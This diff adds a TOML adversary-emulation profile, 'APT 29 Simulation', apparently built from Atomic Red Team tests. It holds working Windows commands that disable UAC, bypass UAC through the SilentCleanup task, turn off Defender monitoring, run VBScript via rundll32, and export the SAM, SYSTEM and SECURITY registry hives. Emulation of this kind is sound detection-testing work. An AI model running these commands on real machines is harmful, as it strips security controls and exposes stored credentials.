@@ -1,0 +1,231 @@
+id = "24df85d3-3375-410e-9dda-b34f143fe55f"
+version = 1
+name = "APT 29 Simulation"
+
+[[procedures]]
+id = "9e8af564-53ec-407e-aaa8-3cb20c3af7f9"
+name = "Disable UAC using reg.exe"
+description = '''
+Disable User Account Conrol (UAC) using the builtin tool reg.exe by changing its registry key
+HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\EnableLUA from 1 to 0
+'''
+primary_technique = "T1548.002"
+primary_tactic = "defense-evasion"
+mitre_tactics_ref = ["privilege-escalation", "defense-evasion"]
+supported_platforms = ["windows"]
+dependency_checks = []
+src_type = "art"
+tags = []
+threat_profile_ids = []
+variables = []
+
+[[procedures.procedure_steps]]
+instance_id = 218
+fe_id = "aa4b31ae-b9d9-42ad-b8c4-c2d422a899b7"
+order = 0
+executor = "command_prompt"
+command = '''
+reg.exe ADD HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA /t REG_DWORD /d 0 /f
+'''
+privilege = true
+
+[[procedures.cleanup_steps]]
+instance_id = 219
+fe_id = "62eb7b20-1db9-4b3b-bb78-40f42ce84bc4"
+order = 0
+executor = "command_prompt"
+command = '''
+reg.exe ADD HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA /t REG_DWORD /d 1 /f
+'''
+privilege = true
+
+[[procedures]]
+id = "28104f8a-4ff1-4582-bcf6-699dce156608"
+name = "Bypass UAC using SilentCleanup task"
+description = '''
+Bypass UAC using SilentCleanup task on Windows 8-10 using bat file from https://www.reddit.com/r/hacking/comments/ajtrws/bypassing_highest_uac_level_windows_810/
+
+There is an auto-elevated task called SilentCleanup located in %windir%\system32\cleanmgr.exe This can be abused to elevate any file with Administrator privileges without prompting UAC (even highest level).
+
+For example, we can set the windir registry kye to: "cmd /k REM "
+
+And forcefully run SilentCleanup task:
+
+schtasks /run /tn \Microsoft\Windows\DiskCleanup\SilentCleanup /I
+
+REM will tell it to ignore everything after %windir% and treat it just as a NOTE. Therefore just executing cmd with admin privs.
+'''
+primary_technique = "T1548.002"
+primary_tactic = "defense-evasion"
+mitre_tactics_ref = ["privilege-escalation", "defense-evasion"]
+supported_platforms = ["windows"]
+dependency_checks = []
+cleanup_steps = []
+src_type = "art"
+tags = []
+threat_profile_ids = []
+
+[[procedures.procedure_steps]]
+instance_id = 220
+fe_id = "7655354b-978f-4c1e-af03-186ae8481469"
+order = 0
+executor = "command_prompt"
+command = """
+"#{file_path}"
+"""
+privilege = false
+
+[[procedures.variables]]
+instance_id = 116
+description = "Path to the bat file"
+var_type = "string"
+name = "file_path"
+default = 'PathToAtomicsFolder\T1548.002\src\T1548.002.bat'
+
+[[procedures]]
+id = "6b8df440-51ec-4d53-bf83-899591c9b5d7"
+name = "Tamper with Windows Defender ATP PowerShell"
+description = """
+Attempting to disable scheduled scanning and other parts of windows defender atp. Upon execution Virus and Threat Protection will show as disabled
+in Windows settings.
+"""
+primary_technique = "T1562.001"
+primary_tactic = "defense-evasion"
+mitre_tactics_ref = ["defense-evasion"]
+supported_platforms = ["windows"]
+dependency_checks = []
+src_type = "art"
+tags = []
+threat_profile_ids = []
+variables = []
+
+[[procedures.procedure_steps]]
+instance_id = 1900
+fe_id = "ecf31074-0a04-47f5-9ead-7ffc6c283cad"
+order = 0
+executor = "powershell"
+command = """
+Set-MpPreference -DisableRealtimeMonitoring 1
+Set-MpPreference -DisableBehaviorMonitoring 1
+Set-MpPreference -DisableScriptScanning 1
+Set-MpPreference -DisableBlockAtFirstSeen 1
+"""
+privilege = true
+
+[[procedures.cleanup_steps]]
+instance_id = 1901
+fe_id = "7a86ba0b-6059-483e-b20b-7f79280cf2cd"
+order = 0
+executor = "powershell"
+command = """
+Set-MpPreference -DisableRealtimeMonitoring 0
+Set-MpPreference -DisableBehaviorMonitoring 0
+Set-MpPreference -DisableScriptScanning 0
+Set-MpPreference -DisableBlockAtFirstSeen 0
+"""
+privilege = true
+
+[[procedures]]
+id = "32d1cf1b-cbc2-4c09-8d05-07ec5c83a821"
+name = "Rundll32 execute VBscript command using Ordinal number"
+description = """
+Test execution of a command using rundll32.exe and VBscript in a similar manner to the JavaScript test.
+Technique documented by Hexacorn- http://www.hexacorn.com/blog/2019/10/29/rundll32-with-a-vbscript-protocol/
+Upon execution calc.exe will be launched
+"""
+primary_technique = "T1218.011"
+primary_tactic = "defense-evasion"
+mitre_tactics_ref = ["defense-evasion"]
+supported_platforms = ["windows"]
+dependency_checks = []
+cleanup_steps = []
+src_type = "art"
+tags = []
+threat_profile_ids = []
+
+[[procedures.procedure_steps]]
+instance_id = 2749
+fe_id = "40198371-39b2-4203-b46b-4aca5a4dc993"
+order = 0
+executor = "command_prompt"
+command = '''
+rundll32 vbscript:"\..\mshtml,#135 "+String(CreateObject("WScript.Shell").Run("#{command_to_execute}"),0)
+'''
+privilege = false
+
+[[procedures.variables]]
+instance_id = 1435
+description = "Command for rundll32.exe to execute"
+var_type = "string"
+name = "command_to_execute"
+default = "calc.exe"
+
+[[procedures]]
+id = "21df41be-cdd8-4695-a650-c3981113aa3c"
+name = "Dumping of SAM, creds, and secrets(Reg Export)"
+description = """
+Local SAM (SAM & System), cached credentials (System & Security) and LSA secrets (System & Security) can be enumerated via three registry keys. Used reg export to execute this behavior
+Upon successful execution of this test, you will find three files named, sam, system and security in the %temp% directory.
+"""
+primary_technique = "T1003.002"
+primary_tactic = "credential-access"
+mitre_tactics_ref = ["credential-access"]
+supported_platforms = ["windows"]
+dependency_checks = []
+src_type = "art"
+tags = []
+threat_profile_ids = []
+variables = []
+
+[[procedures.procedure_steps]]
+instance_id = 1061
+fe_id = "06da53d0-36d9-4f42-b9a1-c98437160622"
+order = 0
+executor = "command_prompt"
+command = '''
+reg export HKLM\sam %temp%\sam
+reg export HKLM\system %temp%\system
+reg export HKLM\security %temp%\security
+'''
+privilege = true
+
+[[procedures.cleanup_steps]]
+instance_id = 1062
+fe_id = "e53a0c91-71c6-4b68-8a8d-385c3d8f9844"
+order = 0
+executor = "command_prompt"
+command = '''
+del %temp%\sam >nul 2> nul
+del %temp%\system >nul 2> nul
+del %temp%\security >nul 2> nul
+'''
+privilege = true
+
+[[procedures]]
+id = "3b3809b6-a54b-4f5b-8aff-cb51f2e97b34"
+name = "Process Discovery - Get-Process"
+description = """
+Utilize Get-Process PowerShell cmdlet to identify processes.
+
+Upon successful execution, powershell.exe will execute Get-Process to list processes. Output will be via stdout. 
+"""
+primary_technique = "T1057"
+primary_tactic = "discovery"
+mitre_tactics_ref = ["discovery"]
+supported_platforms = ["windows"]
+dependency_checks = []
+cleanup_steps = []
+src_type = "art"
+tags = []
+threat_profile_ids = []
+variables = []
+
+[[procedures.procedure_steps]]
+instance_id = 1260
+fe_id = "6111fca0-ef94-4536-b17b-d8a2b7a075f8"
+order = 0
+executor = "powershell"
+command = """
+Get-Process
+"""
+privilege = false
